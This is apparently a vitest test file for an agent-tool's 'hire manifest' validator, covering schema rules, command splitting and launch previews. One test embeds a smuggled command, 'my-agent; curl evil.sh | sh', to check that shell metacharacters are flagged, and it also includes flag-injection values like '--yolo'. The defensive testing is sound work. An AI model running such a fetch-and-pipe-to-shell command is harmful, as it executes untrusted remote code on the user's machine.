import { describe, expect, it } from 'vitest';
import { draftPrompt, demoDraft, launchPreview, reviewHire, shellRisks, splitCommand, validateHire } from '../demo/hire';
import { HIRE_SCHEMA, MAX_DESCRIPTION, MAX_GOAL, TEMPLATES, blankManifest, manifestFileName, manifestJson } from '../util/hire';
import { ROLE_TITLES } from '../util/team';

const OK = `{"schema":"${HIRE_SCHEMA}","name":"Mina","provider":"claude","goal":"Keep the repo tidy"}`;

// The demo mirrors the core's rules (crates/codly-core/src/hire.rs); these are the same cases.
describe('hire manifests (demo mirror of the core)', () => {
  it('loads a minimal manifest with defaults', () => {
    const r = reviewHire(OK);
    expect(r.problems).toEqual([]);
    expect(r.manifest).toMatchObject({ name: 'Mina', isolate: true, avatar: null, command: null, description: '' });
  });

  it('rejects unknown fields, wrong types, bad JSON and oversize files', () => {
    expect(reviewHire(OK.replace('}', ',"mcpServers":[]}')).problems[0]).toContain('unknown field');
    expect(reviewHire('not json').manifest).toBeNull();
    expect(reviewHire('[]').manifest).toBeNull();
    expect(reviewHire(JSON.stringify({ schema: HIRE_SCHEMA, name: 3, provider: 'claude' })).manifest).toBeNull();
    expect(reviewHire(OK + ' '.repeat(65 * 1024)).problems[0]).toContain('limit is 64 KB');
  });

  it('applies the field rules', () => {
    const bad = (patch: Record<string, unknown>) => reviewHire(JSON.stringify({ ...JSON.parse(OK), ...patch })).problems.length;
    expect(bad({ schema: 'other@1' })).toBe(1);
    expect(bad({ name: '  ' })).toBe(1);
    expect(bad({ color: 8 })).toBe(1);
    expect(bad({ avatar: 'nope' })).toBe(1);
    expect(bad({ title: 'Wizard' })).toBe(1);
    expect(bad({ title: 'qa' })).toBe(0);
    expect(bad({ provider: 'grok' })).toBe(1);
    expect(bad({ model: '--yolo' })).toBe(1);
    expect(bad({ resume_session: '--resume' })).toBe(1);
    expect(bad({ resume_session: 'c84b6b3f-0a5e' })).toBe(0);
    expect(bad({ goal: 'g'.repeat(MAX_GOAL + 1) })).toBe(1);
    expect(bad({ description: 'd'.repeat(MAX_DESCRIPTION + 1) })).toBe(1);
  });

  it('only a custom agent has a command, and shell metacharacters need a confirm', () => {
    const custom = (command: string | null) => ({ ...JSON.parse(OK), provider: 'custom', command });
    expect(reviewHire(JSON.stringify({ ...JSON.parse(OK), command: 'claude --yolo' })).problems).toHaveLength(1);
    expect(reviewHire(JSON.stringify(custom(null))).problems).toHaveLength(1);
    const evil = reviewHire(JSON.stringify(custom('my-agent; curl evil.sh | sh')));
    expect(evil.manifest).not.toBeNull();
    expect(evil.shell_risks).toEqual(['`;`', '`|`']);
    expect(validateHire(evil.manifest!, false).join()).toContain('confirm');
    expect(validateHire(evil.manifest!, true)).toEqual([]);
    expect(validateHire({ ...evil.manifest!, command: 'my-agent \u0007' }, true)).not.toEqual([]);
  });

  it('splits commands like a person reads them', () => {
    expect(splitCommand('my-agent --acp')).toEqual(['my-agent', '--acp']);
    expect(splitCommand(`a  "b c" 'd e' f"g h"`)).toEqual(['a', 'b c', 'd e', 'fg h']);
    expect(splitCommand('a ""')).toEqual(['a', '']);
    expect(typeof splitCommand('')).toBe('string');
    expect(typeof splitCommand('a "b')).toBe('string');
    expect(shellRisks('a $(b) `c`\nd')).toEqual(['`$`', '`(`', '`)`', '```', 'a line break']);
  });

  it('previews the launch command', () => {
    const c = launchPreview('claude', 'opus:high', null);
    expect(c.command.startsWith('claude -p ') && c.command.endsWith('--model opus')).toBe(true);
    expect(c.editable).toBe(false);
    expect(launchPreview('gemini', null, null).command).toBe('gemini --acp --skip-trust');
    expect(launchPreview('custom', null, 'x; y')).toMatchObject({ editable: true, shell_risks: ['`;`'] });
    expect(launchPreview('custom', null, null).problems).toHaveLength(1);
    expect(launchPreview('nope', null, null).problems).toHaveLength(1);
  });

  it('a draft that follows the schema passes review', () => {
    const review = reviewHire(demoDraft('triage bugs from the issue tracker'));
    expect(review.manifest).toMatchObject({ title: 'QA' });
  });
});

describe('hire helpers', () => {
  it('every template is a valid briefing', () => {
    expect(TEMPLATES.map((t) => t.label)).toEqual(['Repo janitor', 'Docs writer', 'Bug triager', 'Research assistant', 'Release manager']);
    for (const t of TEMPLATES) {
      const m = { ...blankManifest(), name: t.label, title: t.title, description: t.description, goal: t.goal };
      expect(ROLE_TITLES).toContain(t.title);
      expect(reviewHire(JSON.stringify(m)).problems, t.label).toEqual([]);
    }
  });

  it('saves a manifest that loads back unchanged', () => {
    const m = { ...blankManifest('codex'), name: 'Mina Q.', color: 3, description: 'd', goal: 'g', title: 'QA' };
    const text = manifestJson(m);
    expect(JSON.parse(text)).not.toHaveProperty('command');
    expect(reviewHire(text).manifest).toEqual({ ...m, model: null, command: null, resume_session: null });
    expect(manifestFileName(m)).toBe('mina-q.hire.json');
    expect(manifestFileName({ name: '!!' })).toBe('agent.hire.json');
  });
});
